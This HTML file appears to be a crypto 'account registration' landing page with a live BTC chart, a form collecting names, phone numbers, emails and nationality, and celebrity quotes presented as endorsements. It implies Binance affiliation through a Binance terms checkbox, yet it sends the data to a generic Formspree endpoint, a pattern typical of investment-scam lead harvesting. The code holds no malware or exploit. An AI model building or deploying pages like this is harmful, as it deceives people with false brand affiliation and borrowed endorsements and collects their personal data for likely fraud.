<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Account Registration</title> <link rel="stylesheet" href="style.css">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/23.0.10/css/intlTelInput.css" integrity="sha512-qc5ao9G+o/Nn7o+7uM+13N08g+lFbO+2/Zt+wCLl3/122u7IqIS7+7c55eN1f0LwAgF1LhIDfYvL5X3+FpV/xw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/choices.js@9.0.1/public/assets/styles/choices.min.css"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/7.2.1/css/flag-icons.min.css" integrity="sha512-cjqYBiqGqLWEhxfDMJUzoYfs6LGBGlIWwYgdGcjQoCbM/dcZEqnhj7eJgRhkD8dxLNs+wLfREOeqAjvRvsanxw==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    <style>
      /* Minimal inline styles - move to style.css if preferred */
      .iti { width: 100%; }
      .choices__item--choice .fi, .choices__item--selected .fi { /* Style flags in dropdown & selected item */
          margin-right: 8px; vertical-align: middle; width: 1.33em; height: 1em;
          background-size: contain; background-repeat: no-repeat; background-position: center;
          display: inline-block; border: 1px solid #eee; flex-shrink: 0;
      }
      .terms-label { font-weight: normal; display: inline; }
      .terms-label a { color: #007bff; text-decoration: none;}
      .terms-label a:hover { text-decoration: underline;}
      .mandatory-star { color: red; margin-left: 3px;}
    </style>

</head>
<body>

    <div class="main-container">

        <div class="left-column">
            <h2>Live Crypto Prices</h2>
            <div class="tradingview-widget-container" style="height:400px; width:100%;">
              <div class="tradingview-widget-container__widget" style="height:calc(100% - 32px); width: 100%;"></div>
              <div class="tradingview-widget-copyright"><a href="https://www.tradingview.com/" rel="noopener nofollow" target="_blank"><span class="blue-text">Track all markets on TradingView</span></a></div>
              <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-mini-chart.js" async>
              {
              "symbol": "BINANCE:BTCUSDT",
              "width": "100%",
              "height": "100%",
              "locale": "en",
              "dateRange": "1D",
              "colorTheme": "light",
              "isTransparent": false,
              "autosize": true,
              "largeChartUrl": ""
              }
              </script>
            </div>
            <p style="text-align:center; margin-top: 20px; font-size: 0.9em;">Chart data provided by TradingView.</p>
        </div>

        <div class="right-column">
            <h1>Create Your Account</h1>
            <p>Fill in all fields to get started.</p>

            <form id="contact-form" action="https://formspree.io/f/xldbrazl" method="POST">

                <div class="form-group">
                    <label for="first_name">First Name:<span class="mandatory-star">*</span></label>
                    <input type="text" id="first_name" name="first_name" required>
                </div>

                <div class="form-group">
                    <label for="surname">Surname:<span class="mandatory-star">*</span></label>
                    <input type="text" id="surname" name="surname" required>
                </div>

                <div class="form-group">
                     <fieldset>
                        <legend>Do you have trading experience?<span class="mandatory-star">*</span></legend>
                        <label><input type="radio" name="experience" value="yes" required> Yes</label>
                        <label><input type="radio" name="experience" value="no" required> No</label>
                    </fieldset>
                </div>

                 <div class="form-group">
                    <label for="gender">Gender:<span class="mandatory-star">*</span></label>
                    <select id="gender" name="gender" required>
                        <option value="">--Please select--</option>
                        <option value="male">Male</option>
                        <option value="female">Female</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="email">Email Address:<span class="mandatory-star">*</span></label>
                    <input type="email" id="email" name="_replyto" required>
                </div>

                <div class="form-group">
                    <label for="phone">Phone Number:<span class="mandatory-star">*</span></label>
                    <input type="tel" id="phone" name="phone" required>
                </div>

                 <div class="form-group">
                    <label for="nationality">Nationality:<span class="mandatory-star">*</span></label>
                    <select id="nationality" name="nationality" required>
                        <option value="">--Select Country--</option>
                        <option value="af">Afghanistan</option>
                        <option value="al">Albania</option>
                        <option value="dz">Algeria</option>
                        <option value="ad">Andorra</option>
                        <option value="ao">Angola</option>
                        <option value="ar">Argentina</option>
                        <option value="am">Armenia</option>
                        <option value="au">Australia</option>
                        <option value="at">Austria</option>
                        <option value="az">Azerbaijan</option>
                        <option value="bs">Bahamas</option>
                        <option value="bh">Bahrain</option>
                        <option value="bd">Bangladesh</option>
                        <option value="by">Belarus</option>
                        <option value="be">Belgium</option>
                        <option value="bz">Belize</option>
                        <option value="br">Brazil</option>
                        <option value="ca">Canada</option>
                        <option value="cn">China</option>
                        <option value="fr">France</option>
                        <option value="ge">Georgia</option> <option value="de">Germany</option>
                        <option value="in">India</option>
                        <option value="id">Indonesia</option>
                        <option value="it">Italy</option>
                        <option value="jp">Japan</option>
                        <option value="mx">Mexico</option>
                        <option value="ng">Nigeria</option>
                        <option value="pk">Pakistan</option>
                        <option value="ru">Russia</option>
                        <option value="sa">Saudi Arabia</option>
                        <option value="za">South Africa</option>
                        <option value="kr">South Korea</option>
                        <option value="es">Spain</option>
                        <option value="se">Sweden</option>
                        <option value="ch">Switzerland</option>
                        <option value="tr">Turkey</option>
                        <option value="ua">Ukraine</option>
                        <option value="ae">United Arab Emirates</option>
                        <option value="gb">United Kingdom</option>
                        <option value="us">United States</option>
                        <option value="vn">Vietnam</option>
                        </select>
                </div>

                <div class="form-group terms-group">
                     <label for="terms_agreed">
                        <input type="checkbox" id="terms_agreed" name="terms_agreed" value="yes" required>
                        <span class="terms-label">I certify that I am 18 years of age or older, and agree to the Binance's <a href="https://www.binance.com/en/terms" target="_blank" rel="noopener noreferrer">Terms of Use</a> and <a href="https://www.binance.com/en/privacy" target="_blank" rel="noopener noreferrer">Privacy Policy</a>.<span class="mandatory-star">*</span></span>
                    </label>
                </div>

                <button type="submit">Create Account</button>
                <p id="form-status"></p>

            </form>
             <div class="reviews-section">
                <h2>What People Are Saying</h2>
                <blockquote>
                    <p>"Bitcoin is a technological tour de force."</p>
                    <footer>- Bill Gates (Note: Views may evolve)</footer>
                </blockquote>
                <blockquote>
                    <p>"Cryptocurrency is a far better way to transfer value than a piece of paper, that's for sure."</p>
                    <footer>- Elon Musk (Note: Views specific context may vary)</footer>
                </blockquote>
                 <blockquote>
                    <p>"Blockchain technology has the potential to revolutionize various industries."</p>
                    <footer>- Financial Analyst</footer>
                 </blockquote>
                 <p class="disclaimer">Note: These quotes are illustrative examples. Individual views on cryptocurrency can be complex and change over time. Conduct your own research.</p>
            </div>
             </div> </div> <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/23.0.10/js/intlTelInput.min.js" integrity="sha512-0PksPNPkv+sP29l44+EKq797gG0oMLyzClx8eFqF/XyqB/nU4Gz4U/T+W6fU/c8l8/Q+3nBTmF91f72QSmwHqg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdn.jsdelivr.net/npm/choices.js@9.0.1/public/assets/scripts/choices.min.js"></script>

    <script>
      // ----- Initialize intl-tel-input -----
      const phoneInputField = document.querySelector("#phone");
      const phoneInput = window.intlTelInput(phoneInputField, {
          utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/23.0.10/js/utils.js",
          initialCountry: "auto",
          geoIpLookup: callback => {
              fetch("https://ipapi.co/json")
                  .then(res => res.json())
                  .then(data => callback(data.country_code))
                  .catch(() => callback("us"));
          },
          separateDialCode: true,
          preferredCountries: ["ge", "us", "gb"],
      });

      // ----- Initialize Choices.js for Nationality -----
      const nationalityElement = document.querySelector('#nationality');
      // Check if element exists before initializing
      if (nationalityElement) {
          const choices = new Choices(nationalityElement, {
              searchEnabled: true,
              itemSelectText: '',
              // --- Corrected Callback to render choices with flags ---
              callbackRenderChoice: (template, data) => {
                  // Template is the default HTML structure for a choice item
                  // Data contains info like label, value, customProperties, etc.
                  const countryCode = data.value ? data.value.toLowerCase() : ''; // Ensure lowercase
                  if (countryCode) {
                      // Add the flag span with correct classes before the label
                      template.innerHTML = `<span class="fi fi-${countryCode}"></span> ${data.label}`;
                  } else {
                      // Fallback for placeholder or items without value
                      template.innerHTML = data.label;
                  }
                  return template;
              },
              // --- Optional: Render selected item with flag (Needs more robust template handling) ---
              // callbackRenderSelectedItem: (template, data) => {
              //     const countryCode = data.value ? data.value.toLowerCase() : '';
              //     if (countryCode) {
              //          template.innerHTML = `<span class="fi fi-${countryCode}"></span> ${data.label}`;
              //     } else {
              //          template.innerHTML = data.label;
              //     }
              //     // Note: This simplistic approach removes the 'remove item' button.
              //     // A more complex solution would parse the template and insert carefully.
              //     return template;
              // }
          });
      } else {
          console.error("Nationality select element not found.");
      }


      // ----- Form submission handling -----
      // (Same submit handler function as before - make sure it's here)
      var form = document.getElementById("contact-form");
      var status = document.getElementById("form-status");
      async function handleSubmit(event) {
          event.preventDefault();
          const termsCheckbox = document.getElementById('terms_agreed');
          if (!termsCheckbox.checked) {
              status.innerHTML = "You must agree to the terms and conditions.";
              status.className = 'error';
              status.style.display = 'block'; // Ensure status is visible
              const termsGroup = document.querySelector('.terms-group');
              if (termsGroup) {
                termsGroup.style.border = '1px solid red';
                setTimeout(() => { termsGroup.style.border = '1px solid #eee'; }, 3000);
              }
              return;
          }
          const fullNumber = phoneInput.getNumber();
          let hiddenInput = form.querySelector('input[name="full_phone_number"]');
          if (!hiddenInput) {
              hiddenInput = document.createElement('input');
              hiddenInput.type = 'hidden'; hiddenInput.name = 'full_phone_number';
              form.appendChild(hiddenInput);
          }
          hiddenInput.value = fullNumber;
          var data = new FormData(event.target);
          status.innerHTML = 'Submitting...'; status.className = ''; status.style.display = 'block';
          fetch(event.target.action, {
              method: form.method, body: data, headers: { 'Accept': 'application/json' }
          }).then(response => {
              if (response.ok) {
                  status.innerHTML = "Account details submitted successfully!"; status.className = 'success';
                  form.reset();
                  phoneInput.setCountry("ge"); // Reset phone country
                  // Reset choices.js selection if nationalityElement exists
                  if (nationalityElement) {
                      const choicesInstance = nationalityElement.choices; // Access the instance
                      if (choicesInstance) {
                          choicesInstance.setChoiceByValue('');
                      }
                  }
              } else {
                  response.json().then(data => {
                      status.innerHTML = data.errors ? data.errors.map(e => e.message).join(", ") : "Oops! Problem submitting form.";
                      status.className = 'error';
                  }).catch(() => {
                       status.innerHTML = "Oops! Problem submitting form (server error)."; status.className = 'error';
                  });
              }
          }).catch(error => {
              status.innerHTML = "Oops! Network error."; status.className = 'error';
          });
      }
      form.addEventListener("submit", handleSubmit);
    </script>

</body>
</html>